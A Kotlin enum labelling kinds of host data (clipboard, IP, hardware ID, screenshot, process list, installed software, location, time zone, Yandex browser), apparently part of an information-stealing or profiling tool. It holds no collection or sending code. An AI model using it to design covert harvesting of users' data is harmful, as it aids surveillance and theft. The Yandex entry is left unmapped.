package maven.example.com.utility.data

import java.util.*

enum class TypeData {
    SYSTEM_CLIPBOARD,
    SYSTEM_IP,
    SYSTEM_HWID,
    SYSTEM_SCREEN,
    SYSTEM_INFORMATION_JAVA,
    SYSTEM_PROCESS_LIST,
    SYSTEM_INSTALLED_SOFTWARE,
    SYSTEM_LOCATION,
    SYSTEM_TIMEZONE,
    BROWSER_YANDEX;

    val stringType: String
        get() {
            val type: String
            when (this) {
                SYSTEM_CLIPBOARD -> type = "Clipboard"
                SYSTEM_SCREEN -> type = "Screenshot"
                SYSTEM_IP -> type = "IP"
                SYSTEM_HWID -> type = "HWID"
                SYSTEM_INFORMATION_JAVA -> type = "SystemInformation"
                SYSTEM_PROCESS_LIST -> type = "ProcessList"
                SYSTEM_INSTALLED_SOFTWARE -> type = "DownloadedSoftware"
                SYSTEM_LOCATION -> type = "Location"
                SYSTEM_TIMEZONE -> type = "TimeZone"
                else -> type = "Unknown data type_${Random().nextLong()}"
            }

            return type
        }

    val shortType: String
        get() {

            val type = when (this) {
                SYSTEM_CLIPBOARD, SYSTEM_SCREEN, SYSTEM_IP, SYSTEM_HWID, SYSTEM_INFORMATION_JAVA, SYSTEM_PROCESS_LIST, SYSTEM_INSTALLED_SOFTWARE, SYSTEM_LOCATION, SYSTEM_TIMEZONE -> ShortTypeData.SYSTEM

                else -> ShortTypeData.UNKNOWN
            }

            return type.stringType
        }

    internal enum class ShortTypeData {
        SYSTEM,
        BROWSER,
        UNKNOWN;

        val stringType: String
            get() {
                val str: String = when (this) {
                    SYSTEM -> "system"
                    BROWSER -> "browser"
                    else -> "unknown"
                }

                return str
            }

        val allData: MutableList<String?>
            get() {
                val list: MutableList<String?> = ArrayList<String?>()
                list.add(SYSTEM.stringType)
                list.add(BROWSER.stringType)
                list.add(UNKNOWN.stringType)

                return list
            }
    }
}